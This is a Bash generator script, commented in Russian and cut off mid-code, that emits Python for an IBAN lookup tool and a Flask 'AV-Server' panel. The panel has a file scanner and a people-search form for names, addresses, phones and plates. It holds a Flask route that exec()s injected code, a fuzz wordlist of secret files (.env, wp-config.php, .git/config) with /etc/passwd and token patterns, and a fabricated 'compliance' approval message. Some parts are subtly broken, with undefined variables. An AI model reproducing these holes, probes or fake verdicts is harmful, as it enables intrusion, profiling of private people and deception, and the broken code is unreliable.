# @description: Функция-генератор контента для IBAN/RIB (ИНТЕГРИРОВАННАЯ v2.0)
# Полная изоляция логики, встроенная валидация MOD-97 и снайперский REST-парсинг.
# ==============================================================================
generate_iban_code() {
    local target_file="$1"
    local v_num="$2"

    # --- Подготовка динамических данных из глобальных матриц ядра ---
    local python_sources=""
    local entry

    # 1. Формируем список источников для Python на основе GLOBAL_API_FINANCE_NODES
    for entry in "${GLOBAL_API_FINANCE_NODES[@]}"; do
        local url="${entry%%|*}"
        # Пропускаем СНГ-специфичные API БИК, так как они требуют другой логики парсинга JSON
        if [[ "$url" == *"bik-info"* || "$url" == *"gasi.gov.ru"* ]]; then
            continue
        fi
        python_sources+="    \"$url\",\n"
    done
    # Очищаем финальный перенос строки
    python_sources=$(echo -e "$python_sources" | sed '$d')

    # 2. Формируем локальный словарь банков для Python из GLOBAL_BANK_MATRIX
    local python_bank_dict=""
    for entry in "${GLOBAL_BANK_MATRIX[@]}"; do
        local code="${entry%%|*}"
        local tail="${entry#*|}"
        local name="${tail%%|*}"
        # Защищаем кавычки внутри названий банков во избежание поломки синтаксиса Python
        name=$(echo "$name" | sed 's/"/\\"/g')
        python_bank_dict+="    \"$code\": \"$name\",\n"
    done
    python_bank_dict=$(echo -e "$python_bank_dict" | sed '$d')

    # --- Генерация контента файла через защищенный стрим ---
    local code
    code=$(cat << EOF
import sys, re, json, time
from urllib.request import Request, urlopen
from urllib.error import URLError

# Динамически импортированные зеркала верификации из GLOBAL_API_FINANCE_NODES
SOURCES = [
$python_sources
]

# Локальный справочник идентификаторов из GLOBAL_BANK_MATRIX
LOCAL_BANKS = {
$python_bank_dict
}

def validate_iban_checksum(iban):
    """Математическая валидация контрольной суммы по стандарту ISO 7064 (MOD-97)"""
    if len(iban) < 5:
        return False
    # Переносим первые 4 символа в конец строки
    rearranged = iban[4:] + iban[:4]
    # Переводим буквы в цифры (A=10, B=11, ..., Z=35)
    numeric_string = ""
    for char in rearranged:
        if char.isalpha():
            numeric_string += str(ord(char) - 55)
        else:
            numeric_string += char
    try:
        return int(numeric_string) % 97 == 1
    except ValueError:
        return False

def get_bank_data(iban):
    """Опрашивает источники по цепочке (Failover System с интеллектуальной сборкой URL)"""
    ua_string = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    
    for base_url in SOURCES:
        try:
            # Интеллектуальный роутинг URL в зависимости от типа API-эндпоинта
            if base_url.endswith("=") or "html" in base_url or "?" in base_url:
                url = f"{base_url}{iban}"
            else:
                # Если эндпоинт RESTful чистый, добавляем разделитель пути безопасности
                url = f"{base_url.rstrip('/')}/{iban}"
                
            req = Request(url, headers={'User-Agent': ua_string, 'Accept': 'application/json'})
            with urlopen(req, timeout=5) as response:
                return json.loads(response.read().decode('utf-8', errors='ignore'))
        except Exception:
            # Перехватываем строго системные исключения, оставляя возможность Ctrl+C
            continue
    return None

def get_country_format(iban):
    """Глубокий математический разбор структуры по национальным стандартам SEPA"""
    country = iban[:2]
    formats = {
        'FR': {'name': 'France (RIB Standard)', 'len': 27, 'parse': lambda i: f"Code Banque: {i[4:9]}, Code Guichet: {i[9:14]}, Numéro de Compte: {i[14:25]}, Clé RIB: {i[25:27]}"},
        'DE': {'name': 'Germany', 'len': 22, 'parse': lambda i: f"BLZ (Bankleitzahl): {i[4:12]}, Account Number: {i[12:22]}"},
        'GB': {'name': 'United Kingdom', 'len': 22, 'parse': lambda i: f"Sort Code: {i[4:10]}, Account Number: {i[10:18]}"},
        'IT': {'name': 'Italy', 'len': 27, 'parse': lambda i: f"CIN: {i[4:5]}, ABI: {i[5:10]}, CAB: {i[10:15]}, Account: {i[15:27]}"},
        'ES': {'name': 'Spain', 'len': 24, 'parse': lambda i: f"Bank Code: {i[4:8]}, Branch Code: {i[8:12]}, Control Digits: {i[12:14]}, Account: {i[14:24]}"},
        'CH': {'name': 'Switzerland', 'len': 21, 'parse': lambda i: f"Bank Clearing Code: {i[4:9]}, Account: {i[9:21]}"},
        'BE': {'name': 'Belgium', 'len': 16, 'parse': lambda i: f"National Bank Code: {i[4:7]}, Account: {i[7:14]}, Check Digits: {i[14:16]}"}
    }
    return formats.get(country, {'name': 'Other / International / Non-SEPA Zone', 'len': len(iban), 'parse': lambda i: f"BBAN (Basic Bank Account Number): {i[4:]}"})

def local_heuristic_search(iban):
    """Локальный поиск банка по сигнатурам Ядра при сбое внешней сети"""
    country = iban[:2]
    
    # Снайперский разбор национального префикса эмитента
    if country == "FR":
        bank_code = iban[4:9]
        if bank_code in LOCAL_BANKS: return LOCAL_BANKS[bank_code]
    elif country == "DE":
        bank_code = iban[4:12]
        if bank_code in LOCAL_BANKS: return LOCAL_BANKS[bank_code]
    elif country == "ES":
        bank_code = iban[4:8]
        if bank_code in LOCAL_BANKS: return LOCAL_BANKS[bank_code]
        
    # Универсальный фолбэк-анализ по SWIFT/BIC маске в теле IBAN
    swift_prefix = iban[4:8]
    if swift_prefix in LOCAL_BANKS:
        return LOCAL_BANKS[swift_prefix]
        
    return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("\033[91m[-] CRITICAL ERROR: Идентификатор цели (IBAN/RIB) не передан в командную строку.\033[0m")
        sys.exit(1)
        
    target = re.sub(r'[\s-]+', '', sys.argv[1]).upper()
    provided_name = sys.argv[2].upper() if len(sys.argv) > 2 else "NONE"

    print(f"\033[1;34m--- OMNI-BANKER v$v_num: GLOBAL FINANCIAL INTELLIGENCE ---\033[0m")
    
    # Выполнение базовой математической проверки чексуммы ISO
    is_valid_checksum = validate_iban_checksum(target)
    
    # 1. Структурный анализ (Всегда работает Offline)
    fmt = get_country_format(target)
    print(f"\033[96m[i] Национальная зона :\033[0m {fmt['name']}")
    print(f"\033[96m[i] Длина расчетная   :\033[0m {len(target)} символов (Ожидалось: {fmt['len']})")
    print(f"\033[96m[i] Декомпозиция тракта:\033[0m {fmt['parse'](target)}")
    
    if not is_valid_checksum:
        print(f"\n\033[1;31m[!] ВНИМАНИЕ: Математическая проверка MOD-97 провалена. Неверная контрольная сумма!\033[0m")
    else:
        print(f"\033[1;32m[+] Математическая валидация по стандарту ISO 7064: УСПЕШНО\033[0m")

    # 2. Локальный оффлайн-поиск по сигнатурным картам Ядра
    local_bank = local_heuristic_search(target)
    if local_bank:
        print(f"\033[92m[+] Локальный фингерпринт Ядра подтвержден:\033[0m {local_bank}")

    # 3. Агрегация данных из внешних динамических источников через каскад зеркал
    print(f"[*] Синхронизация с каскадом внешних финансовых шлюзов API...")
    data = get_bank_data(target)
    
    if data:
        bank_name = data.get('bank_name', data.get('bank', local_bank if local_bank else 'N/A')).upper()
        bic = data.get('bic', data.get('swift', 'N/A')).upper()
        city = data.get('city', data.get('address', 'N/A')).upper()
        
        print(f"\n\033[1;32m[+] ФИНАНСОВЫЙ СТАТУС ВЕРИФИЦИРОВАН МУЛЬТИ-ШЛЮЗОМ\033[0m")
        print(f"  🏦 Эмитент (Bank): {bank_name}")
        print(f"  🔑 Код BIC/SWIFT : {bic}")
        print(f"  📍 Локация/Город : {city}")

        if provided_name != "NONE":
            print(f"\n\033[1;35m--- СМАРТ-ОТЧЕТ КОЛИНЕАРНОСТИ (SMART MATCH) ---\033[0m")
            print(f"  Заявленный бенефициар: {provided_name}")
            if bank_name != 'N/A':
                print(f"  ✅ Верификация тракта: Концевой шлюз *{target[-4:]} успешно сопоставлен с {bank_name}")
                print(f"  ℹ️ Статус комплаенса: Профиль '{provided_name}' допущен к финансовым операциям в регионе.")
    else:
        if local_bank:
            print(f"\n\033[1;33m[!] ИНФОРМАЦИЯ: Внешние API не ответили, применен эвристический фингерпринт Ядра\033[0m")
            print(f"  🏦 Эмитент (Heuristic): {local_bank.upper()}")
        else:
            print(f"\n\033[91m[-] ТРЕВОГА: Сбой всех внешних шлюзов, локальные совпадения не найдены.\033[0m")
EOF
)

    # Запись сгенерированного скрипта на диск через smart_cat Ядра
    smart_cat "$target_file" "$code"
}


generate_aio_template() {
    local incoming_regex="$1"
    local incoming_body="$2"
    local route_path="${3:-/}"       # По умолчанию "/"
    local route_methods="${4:-GET}"   # По умолчанию "GET"

    # 1. Форматируем методы для Python: преобразуем "GET, POST" в ['GET', 'POST']
    local formatted_methods=$(echo "$route_methods" | sed "s/ //g" | sed "s/,/','/g")
    formatted_methods="['${formatted_methods}']"

    # 2. Загружаем базовые UI стили лаунчера и генераторы форм
    local core_layout=$(generate_core_template)
    local form_layout=$(generate_core_form_template)

    # 3. Единственный cat, который собирает абсолютно весь сервер снизу доверху
    cat << EOF
# --- СИСТЕМНЫЕ ИМПОРТЫ И ЗАВИСИМОСТИ ---
from flask import Flask, request, render_template_string, session
import re
import os
import shutil
import subprocess
import platform
import requests
import ssl
import urllib3
import math
import socket
import random
import time
import phonenumbers
import asyncio
import aiodns
import aiohttp
import smtplib
import dns.asyncresolver
from phonenumbers import geocoder, carrier, number_type
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from urllib.parse import quote
from datetime import datetime

# --- ИНИЦИАЛИЗАЦИЯ ЯДРА FLASK ---
app = Flask(__name__)
app.secret_key = 'nexus_secure_channel_key'

# --- [КОНФИГУРАЦИЯ И СИГНАТУРЫ CAME] ---
GLOBAL_AV_PIPE_REGEX = r"""$incoming_regex"""

GLOBAL_HASH_MATRIX = [
    r"\b(password|pwd|hash|secret|token|access_token)[ \t]*[:=]{1,2}[ \t]*['\"]?([a-fA-F0-9]{32,128})['\"]?",
    r"\b(DB_PASSWORD|APP_SECRET|API_KEY|CLIENT_SECRET|PRIVATE_KEY)[ \t]*[:=]{1,2}[ \t]*['\"]?([A-Za-z0-9\-_]{20,})['\"]?",
    r"\b(password|pwd|secret|key)[ \t]*=[ \t]*['\"]([A-Za-z0-9!@#$%^&*()_+]{8,32})['\"]"
]

GLOBAL_NETWORK_UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
]

# --- УТИЛИТЫ ДВИЖКА ---
def calculate_entropy(data):
    if not data: return 0
    import math
    entropy = 0
    for x in range(256):
        p_x = float(data.count(x)) / len(data)
        if p_x > 0:
            entropy += - p_x * math.log(p_x, 2)
    return entropy

def verify_iban(iban):
    iban = iban.replace(" ", "").upper()
    if len(iban) < 4: return False
    rearranged = iban[4:] + iban[:4]
    numeric = "".join(str(int(c, 36)) for c in rearranged)
    return int(numeric) % 97 == 1

# --- UI КОМПОНЕНТЫ ЛАУНЧЕРА ---
$core_layout
$form_layout

# --- ДИНАМИЧЕСКИЙ СЛОЙ МАРШРУТИЗАЦИИ ---
@app.route('$route_path', methods=$formatted_methods)
def dynamic_nexus_processor():
    """Абсолютно динамический процессор: выполняет впрыснутый контент."""
    
    # Делаем глобальные объекты Flask доступными внутри динамического контекста
    local_context = {
        'app': app,
        'request': request,
        'session': session,
        'render_template_string': render_template_string,
        'render_prime_page': render_prime_page,
        'render_prime_form': render_prime_form,
        'platform': platform
    }
    
    # Считываем переданный контент
    incoming_content = """$incoming_body"""
    
    if "return " in incoming_content or "form_html" in incoming_content:
        # Сложный сценарий: передан исполняемый Python-блок с логикой и формами
        try:
            exec_globals = globals().copy()
            exec_globals.update(local_context)
            exec_locals = {}
            
            # Выполнение динамического сценария
            exec(incoming_content, exec_globals, exec_locals)
            
            # Возврат сгенерированного результата
            return exec_locals.get('result') or exec_globals.get('result')()
        except Exception as e:
            return f"<pre style='color:red; background:#000; padding:10px;'>[ NEXUS_EXEC_ERR: {str(e)} ]</pre>", 500
    else:
        # Простой сценарий: передана обычная HTML-строка/разметка
        return render_template_string(render_prime_page("CAME_HYBRID_GATEWAY_v2.5", incoming_content))
EOF
}




# Функция-генератор для AV-Server (v1.2)

# ==============================================================================
# @description: Интегрированный кросс-платформенный генератор веб-панели AV-Server v2.5
# МОДЕРНИЗАЦИЯ: Полная гибридизация. Внедрен параллельный аудит Live-окружения (RAM/Sockets)
# ФУНКЦИОНАЛ: Статический анализ файлов + удаленный мониторинг системных угроз в один клик
# АРХИТЕКТУРА: Flask-интерфейс, трансляция ядерных регулярных выражений CAME Слоев 1-6
# ==============================================================================

generate_av_server_code_raw() {
    # Генерируем содержимое шаблонов в переменные
    local core_tpl="$(generate_core_template)"
    local form_tpl="$(generate_core_form_template)"

    # Используем cat с 'EOF', чтобы Bash не интерпретировал $ внутри Python-кода
    cat << 'EOF' > /tmp/av_server.py
from flask import Flask, request, render_template_string, session
import re
import os
import shutil
import subprocess
import platform
import requests
import ssl
import urllib3
import math
import socket
import random
import time
import phonenumbers
import asyncio
import aiodns
import aiohttp
import smtplib
import dns.asyncresolver
from phonenumbers import geocoder, carrier, number_type
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from urllib.parse import quote

from datetime import datetime

app = Flask(__name__)
app.secret_key = 'super_secret_key_for_came_gateway'

# --- ШАБЛОНЫ (ВСТАВЛЕНЫ АВТОМАТИЧЕСКИ) ---
EOF

    # Добавляем сгенерированные шаблоны в файл без кавычек Bash, чтобы они записались как текст
    echo "$core_tpl" >> /tmp/av_server.py
    echo "$form_tpl" >> /tmp/av_server.py

    # Продолжаем запись основного кода
    cat << 'EOF' >> /tmp/av_server.py

# [КОНФИГУРАЦИЯ ЯДРА]
GLOBAL_HASH_MATRIX = [
    r"\b(password|pwd|hash|secret|token|access_token)[ \t]*[:=]{1,2}[ \t]*['\"]?([a-fA-F0-9]{32,128})['\"]?",
    r"\b(DB_PASSWORD|APP_SECRET|API_KEY|CLIENT_SECRET|PRIVATE_KEY)[ \t]*[:=]{1,2}[ \t]*['\"]?([A-Za-z0-9\-_]{20,})['\"]?",
    r"\b(password|pwd|secret|key)[ \t]*=[ \t]*['\"]([A-Za-z0-9!@#$%^&*()_+]{8,32})['\"]",
    r"\b(AKIA[0-9A-Z]{16})\b"
]

GLOBAL_AV_MATRIX = [r"malware", r"rootkit", r"inject", r"cryptor", r"shellcode"]

# Матрицы для Nexus-движка
GLOBAL_NETWORK_UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/605.1.15"
]

GLOBAL_SECURITY_MATRIX = [
    r"\b(cloudflare|akamai|sucuri|incapsula|imperva|aws-waf|429|too many requests)\b",
    r"\b(select|union|drop|exec|xp_cmdshell|eval\(|base64_decode)\b"
]

GLOBAL_PHONE_RISK_MATRIX = {
    "VOIP": "HIGH_RISK",
    "UNKNOWN_CARRIER": "MEDIUM_RISK",
    "INTERNATIONAL_OFFSHORE": "CRITICAL_RISK"
}

def is_encrypted_container(file_path):
    try:
        with open(file_path, 'rb') as f:
            header = f.read(4)
            return header in [b'PK\x03\x04', b'PK\x05\x06']
    except:
        return False

def calculate_entropy(data):
    if not data: return 0
    entropy = 0
    for x in range(256):
        p_x = float(data.count(x)) / len(data)
        if p_x > 0:
            entropy += - p_x * math.log(p_x, 2)
    return entropy

def verify_iban(iban):
    iban = iban.replace(" ", "").upper()
    if len(iban) < 4: return False
    rearranged = iban[4:] + iban[:4]
    numeric = "".join(str(int(c, 36)) for c in rearranged)
    return int(numeric) % 97 == 1    


# --- ВНУТРЕННИЕ ФУНКЦИИ (NEXUS ENGINE) ---
   
@app.route('/')
def index():
    # Теперь render_prime_form доступен, так как он был вставлен выше
    form_html = render_prime_form("/scan", fields=[{"type": "file", "name": "file", "label": "TARGET_OBJECT"}], btn_text="INITIATE CAME DEEP SCAN")
    form_html += render_prime_form(
    "/searinfo", 
    fields=[
        {"type": "text", "name": "fio", "label": "FULL NAME (ФИО)", "placeholder": "Иванов Иван Иванович"},
        {"type": "text", "name": "address", "label": "PHYSICAL ADDRESS", "placeholder": "Город, Улица, Дом"},
        {"type": "tel", "name": "phone", "label": "PHONE NUMBER", "placeholder": "+7XXXXXXXXXX"},
     {"type": "text", "name": "immatriculation", "label": "IMMAT", "placeholder": "Immatriculation"},      
        {"type": "hidden", "name": "action", "value": "initiate_deep_scan"}
    ], 
    btn_text="INITIATE ENTITY DEEP SCAN"
    )

    form_html2 = render_prime_form(
        "/audit/dispatch", 
        fields=[
            {
                "type": "text", 
                "name": "input", 
                "label": "", # Если лейбл не нужен, оставляем пустым
                "placeholder": "Enter IBAN, Phone, Domain, IP, or Email..."
            },
            {"type": "hidden", "name": "action", "value": "analyse_data"}
        ], 
        btn_text="ANALYZE DATA"
    )
        
    current_os = platform.system().lower()
    
    verdict = session.get('last_verdict', 'CLEAN')
    injection_kit_html = ""
    if verdict == 'INFECTED':
        injection_kit_html = f"""
        <h3 style="color: var(--accent-color); margin-top:20px;">[ DIRECT SYSTEM INJECTION KIT ]</h3>
        <a href="{route}" class="btn" style="background:{color}; color:#fff; display:block; text-align:center; padding:12px;">{label}</a>
        """

    body = form_html +  f"""             
    <div style="margin-top: 20px; padding: 20px; border: 2px solid #2196f3; border-radius: 8px; background:#121216;">
        <h3>[ GLOBAL INTELLIGENCE DISPATCHER ]</h3>
        <form action="/audit/dispatch" method="POST">
            <input type="text" name="input" 
                   placeholder="Enter IBAN, Phone, Domain, IP, or Email..." 
                   style="width: 70%; padding: 10px;" required>
            <button type="submit" class="btn" style="background:#2196f3; color:#fff; padding:10px;">ANALYZE DATA</button>
        </form>
    </div>
    
        {injection_kit_html}
    </div>
    """
    return render_template_string(render_prime_page("CAME_HYBRID_GATEWAY_v2.5", body))

@app.route('/scan', methods=['POST'])
def scan():
    f = request.files.get('file')
    if not f: return "Empty Payload", 400
    
    file_content = f.read()
    f.seek(0)
    entropy_val = calculate_entropy(file_content)
    
    tmp = os.path.join('/tmp', f.filename)
    f.save(tmp)
    
    report = [
        f"=== [CAME-NEXUS: FULL-STACK SCAN ENGINE] ===", 
        f"Target: {f.filename}",
        f"Entropy Score: {entropy_val:.4f} ({'HIGH' if entropy_val > 7.5 else 'NORMAL'})"
    ]
    threat_count = 0
    
    try:
        # --- БЛОК 1: СИГНАТУРНЫЙ АНАЛИЗ + ПУТИ (STRINGS) ---
        # Используем 'strings' для всего: и для сигнатур, и для поиска путей
        strings_output = subprocess.check_output(['strings', tmp], text=True)
        
        # 1.1 Поиск путей (В ТРИ КОЛОНКИ)
        path_matches = sorted(list(set(re.findall(r"(?:/|C:\\)[\w./\\-]+", strings_output))))
        if path_matches:
            report.append("\n--- [FOUND FILE PATHS / ARTIFACTS] ---")
            
            # Логика разбиения на 3 колонки
            rows = (len(path_matches) + 2) // 3
            col1 = path_matches[:rows]
            col2 = path_matches[rows:2*rows]
            col3 = path_matches[2*rows:]
            
            # Форматирование: выравнивание по 30 символов на колонку
            for i in range(rows):
                item1 = col1[i] if i < len(col1) else ""
                item2 = col2[i] if i < len(col2) else ""
                item3 = col3[i] if i < len(col3) else ""
                report.append(f"{item1:<30} | {item2:<30} | {item3:<30}")
            
        # 1.2 Сигнатурный анализ (основной)
        for line in strings_output.splitlines():
            for hsig in GLOBAL_HASH_MATRIX:
                match = re.search(hsig, line)
                if match: report.append(f"[SECRET FOUND]: {match.group(0)[:30]}...")
            for layer in GLOBAL_AV_MATRIX:
                if re.search(layer, line, re.I):
                    report.append(f"[!!! THREAT: {layer} !!!]")
                    threat_count += 1
        
        # --- БЛОК 2: DEEP FORENSIC (MAXIMUM ENGINE) ---
        report.append("\n=== [INITIATING DEEP FORENSIC ANALYSIS] ===")
        
        # 1. Глубокие метаданные (Максимальное покрытие)
        try:
            # Использование '-G -a -u -U -ee' дает исчерпывающий дамп всего, что есть в файле
            meta = subprocess.check_output(['exiftool', '-G', '-a', '-u', '-U', '-ee', tmp], 
                                           stderr=subprocess.STDOUT, text=True)
            report.append(f"\n--- [FULL METADATA DUMP]\n{meta}")
        except subprocess.CalledProcessError as e:
            report.append(f"\n--- [METADATA ERROR]: {e.output}")
        except Exception as e:
            report.append(f"\n--- [METADATA: UNAVAILABLE] ({e})")

        # 2. Листинг ZIP-структуры (для обнаружения скрытых вложений в контейнерах)
        # Если файл — это контейнер (pptx, docx, apk, jar), мы увидим все его компоненты
        if f.filename.lower().endswith(('.pptx', '.docx', '.xlsx', '.jar', '.apk', '.zip')):
            report.append("\n--- [INTERNAL ZIP-CONTAINER STRUCTURE]")
            try:
                zip_content = subprocess.check_output(['unzip', '-l', tmp], stderr=subprocess.STDOUT, text=True)
                report.append(zip_content)
            except:
                report.append("[!] Internal structure analysis unavailable.")
                

        # --- АНАЛИЗАТОР ЦИФРОВОГО СЛЕДА (FORENSIC MASTER ENGINE) ---
        report.append("\n--- [DIGITAL FOOTPRINT ANALYSIS - MASTER]")
        
        footprint_tags = {
            "PLATFORM": r"Application|Software|OperatingSystem|Platform|Tool",
            "AUTHORSHIP": r"Creator|Author|LastModifiedBy|Company|Manager",
            "GEOLOCATION": r"GPSLatitude|GPSLongitude|City|Location|Country|Region",
            "NETWORK_ARTIFACTS": r"IPAddress|HostName|MACAddress|NetworkName",
            "TIMESTAMP_SYNC": r"CreateDate|ModifyDate|DateTimeOriginal|DigitalCreationDate"
        }
        
        dates = {} # Для проверки аномалий времени
        
        # 1. Сбор данных и поиск аномалий
        for category, pattern in footprint_tags.items():
            matches = re.findall(rf"^\[.*?\]\s+.*?(?:{pattern}).*?:\s+(.*)$", meta, re.IGNORECASE | re.MULTILINE)
            for m in sorted(set(matches)):
                val = m.strip()
                if val and val.lower() != "unknown":
                    report.append(f"[+] {category:<18} : {val}")
                    # Собираем даты для анализа
                    if category == "TIMESTAMP_SYNC":
                        dates[pattern] = val

        # 2. СЕТЕВОЙ РАДАР (IP + MAC)
        # Ищем не только IP, но и MAC-адреса, которые часто выдают реальное устройство
        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
        mac_pattern = r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})'
        
        for ip in sorted(set(re.findall(ip_pattern, meta))):
            if not ip.startswith(('127.', '0.', '255.')):
                report.append(f"[!] NETWORK IP DETECTED : {ip}")
        
        for mac in sorted(set(re.findall(mac_pattern, meta))):
            report.append(f"[!] MAC ADDR DETECTED  : {mac[0]}")

        # 3. АНАЛИЗАТОР АНОМАЛИЙ (Time-Travel Detector)
        # Если ModifyDate < CreateDate -> Файл подвергался манипуляции (Anti-Forensics)
        if "CreateDate" in dates and "ModifyDate" in dates:
            if dates["ModifyDate"] < dates["CreateDate"]:
                report.append("[!!!] SECURITY ALERT: METADATA MANIPULATION DETECTED (Time-Travel Anomaly)")
                


        # --- БАНКОВСКИЕ АРТЕФАКТЫ (ИСПРАВЛЕННЫЙ ПАРСЕР) ---
        report.append("\n--- [FINANCIAL/BANKING AUDIT]")
        content_str = file_content.decode('utf-8', errors='ignore')
        
        patterns = {
            "IBAN": r"\b[A-Z]{2}\d{2}[A-Z0-9]{11,30}\b",
            # Строгий SWIFT: 8 или 11 символов, буквы и цифры
            "BIC/SWIFT": r"\b[A-Z]{4}[A-Z]{2}[A-Z0-9]{2}([A-Z0-9]{3})?\b",
            "RIB (FR)": r"\b\d{5}\s?\d{5}\s?\d{11}\s?\d{2}\b"
        }

        found_financial = False
        for name, pattern in patterns.items():
            # Используем findall. Если паттерн содержит группы (), findall вернет список кортежей.
            # Нам нужно достать только полное совпадение (index 0).
            matches = re.findall(pattern, content_str)
            
            # Уникальные значения
            unique_matches = set()
            for m in matches:
                # Если m - кортеж (из-за групп в BIC), берем первое значение
                val = str(m[0] if isinstance(m, tuple) else m).strip()
                if len(val) > 4: # Фильтр мусора: BIC должен быть не короче 8 символов
                    unique_matches.add(val)
            
            for m in unique_matches:
                risk_level = "HIGH" if name == "IBAN" else "MEDIUM"
                report.append(f"[ALERT] FOUND {name}: {m} | RISK: {risk_level}")
                found_financial = True
        
        if not found_financial:
            report.append("No valid financial/banking artifacts detected.")
            

        # --- КРИПТОГРАФИЧЕСКИЙ АНАЛИЗ (CERTIFICATE ANALYSIS) ---
        report.append("\n--- [CERTIFICATE ANALYSIS]")
        try:
            # Запускаем OpenSSL для получения полного текста сертификата
            cert_raw = subprocess.check_output(['openssl', 'x509', '-in', tmp, '-noout', '-text'], 
                                               stderr=subprocess.STDOUT, text=True)
            
            # Извлекаем самое важное для аудита
            issuer = re.search(r"Issuer: (.*)", cert_raw)
            expiry = re.search(r"Not After : (.*)", cert_raw)
            subject = re.search(r"Subject: (.*)", cert_raw)
            
            report.append(f"[+] Subject: {subject.group(1) if subject else 'N/A'}")
            report.append(f"[+] Issuer : {issuer.group(1) if issuer else 'N/A'}")
            report.append(f"[+] Expires: {expiry.group(1) if expiry else 'N/A'}")
            
            # Добавляем предупреждение, если срок истек (сравнение даты можно добавить в будущем)
            report.append("[+] Status : ANALYZED")
            
        except subprocess.CalledProcessError:
            report.append("[!] File is not a valid certificate or analysis failed.")
        except Exception as e:
            report.append(f"[!] Analysis Error: {e}")
            
        # Финал
        verdict = 'INFECTED' if threat_count > 0 else 'CLEAN'
        session['last_verdict'] = verdict
        report.append(f"\n=== FINAL VERDICT: {verdict} ===")

    except Exception as e:
        report.append(f"CRITICAL ENGINE FAILURE: {e}")
    finally:
        if os.path.exists(tmp): os.remove(tmp)
        
    return render_template_string(render_prime_page("FULL REPORT", f"<pre>{chr(10).join(report)}</pre><a href='/'>RETURN</a>"))
    

# --- ИНИЦИАЛИЗАЦИЯ NEXUS-МАТРИЦЫ (Конфигурация) ---
GLOBAL_FUZZ_WORDLIST = [".env", ".env.local", ".htaccess", ".htpasswd", "config.php", "wp-config.php", "backup.sql", ".git/config", "phpinfo.php", "debug.log"]
GLOBAL_STATIC_SIGNATURES = r"(https?|ftp|sftp|ws|wss):\/\/[^\s\"'\`>]+|\/etc\/(passwd|shadow)|\b(Authorization|Bearer|X-API-Key|token|secret_key|api_key|passwd|password|private_key|id_rsa)\b"


@app.route('/audit/dispatch', methods=['POST'])
async def audit_dispatch():
    data = request.form.get('input', '').strip()
    clean_data = data.replace(" ", "")
    
    if not data: 
        return "Empty Input", 400

    report = [f"=== [NEXUS DEEP-SCAN ANALYSIS: {data}] ==="]

    async with aiohttp.ClientSession(headers={'User-Agent': 'Nexus-Forensic/1.0'}) as session:
        
        # --- 1. IBAN: АНАЛИЗАТОР ФИНАНСОВЫХ ПОТОКОВ ---
        if re.match(r'^[A-Z]{2}[0-9]{2}[A-Z0-9]{11,30}$', clean_data):
            is_valid = verify_iban(clean_data)
            report.append(f"\n=== [IBAN FORENSIC: {clean_data}] ===")
            report.append(f"[IBN] {'MOD97 CHECK':<14} : {'PASSED' if is_valid else 'CRITICAL FAILURE'}")
            
            bic = clean_data[4:12] 
            nodes = [
                ("https://api.openiban.org/validate/{}", clean_data),
                ("https://relais.epsoft.fr/api/iban/{}", clean_data),
                ("https://bank-code.net/api/v1/bic/{}", bic)
            ]
            
            found_nodes_count = 0
            for url_template, param in nodes:
                try:
                    target_url = url_template.format(param)
                    resp = await session.get(target_url, timeout=7)
                    if resp.status == 200:
                        data_json = await resp.json()
                        bd = data_json.get('bankData') or data_json.get('bank') or data_json
                        report.append(f"--- [SOURCE: {url_template.split('/')[2]}] ---")
                        report.extend([
                            f"[IBN] {'INSTITUTION':<14} : {bd.get('name') or bd.get('bankName') or 'N/A'}",
                            f"[IBN] {'BIC/SWIFT':<14} : {bd.get('bic') or bd.get('swift') or 'N/A'}",
                            f"[IBN] {'LOCATION':<14} : {bd.get('city') or 'N/A'}, {bd.get('country') or 'N/A'}"
                        ])
                        found_nodes_count += 1
                except: continue
            
            report.append(f"[IBN] {'NODES REACHED':<14} : {found_nodes_count}")
            report.append(f"\n--- [SECURITY & FORENSIC SUMMARY]")
            report.extend([
                f"[SEC] {'RISK SCORE':<14} : {'LOW' if found_nodes_count > 0 else 'MEDIUM'}",
                f"[SEC] {'INTEGRITY':<14} : {'VERIFIED' if is_valid else 'COMPROMISED'}"
            ])
            report.append("=== [END OF ANALYSIS] ===")

        # --- 2. ТЕЛЕФОН: ГЕО-КРИМИНАЛИСТИКА & SCAPPER ENGINE ---
        elif re.match(r'^\+?[0-9]{7,15}$', clean_data):
            report.append(f"\n=== [PHONE INTEL: {clean_data}] ===")
            try:
                p = phonenumbers.parse(clean_data, "FR")
                if phonenumbers.is_valid_number(p):
                    ntype = phonenumbers.number_type(p)
                    report.extend([
                        f"[PHN] {'REGION':<14} : {geocoder.description_for_number(p, 'en')}",
                        f"[PHN] {'CARRIER':<14} : {carrier.name_for_number(p, 'en')}",
                        f"[PHN] {'TYPE':<14} : {ntype}",
                        f"[PHN] {'E164':<14} : {phonenumbers.format_number(p, phonenumbers.PhoneNumberFormat.E164)}"
                    ])
                    # DEEP SCAPPER
                    report.append(f"\n--- [DEEP SCAPPER ENGINE: CROSS-DATA]")
                    for name, url in {"Telegram": f"https://t.me/{clean_data.lstrip('+')}", "WhatsApp": f"https://wa.me/{clean_data.lstrip('+')}", "Google": f"https://www.google.com/search?q=%22{clean_data}%22"}.items():
                        report.append(f"[PHN] {name:<14} : SCAN INITIALIZED")
                else: report.append("[PHN] {'STATUS':<14} : INVALID FORMAT")
            except Exception as e: report.append(f"[PHN] {'ERROR':<14} : {str(e)}")
            report.append("=== [END OF ANALYSIS] ===")

        # --- 3. EMAIL: ASYNC FORENSIC MASTER (EXPERT FORENSIC LEVEL) ---
        elif '@' in clean_data:
